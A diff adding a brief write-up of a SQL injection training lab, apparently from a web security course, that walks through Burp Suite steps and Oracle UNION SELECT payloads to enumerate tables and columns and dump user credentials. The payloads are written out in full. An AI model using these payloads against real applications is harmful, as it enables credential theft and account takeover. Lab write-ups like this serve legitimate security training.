@@ -1,0 +1,29 @@
+SQL Injection - Lab 6
+
+Goal:
+Retrieve usernames and passwords from the database and log in as the administrator user.
+
+Steps:
+1. Intercept the request that sets the product category filter using Burp Suite.
+2. Locate the category parameter.
+3. Determine the number of returned columns using the payload:
+
+'+UNION+SELECT+null,null+FROM+dual-- -
+
+4. Retrieve the list of tables in the database using:
+
+'+UNION+SELECT+table_name,null+FROM+all_tables-- -
+
+5. Identify the table that contains user credentials.
+
+6. Retrieve the column names from the table using:
+
+'+UNION+SELECT+column_name,null+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'-- -
+
+7. Identify the columns containing usernames and passwords.
+
+8. Retrieve the usernames and passwords using:
+
+'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF-- -
+
+9. Find the administrator password and use it to log in.
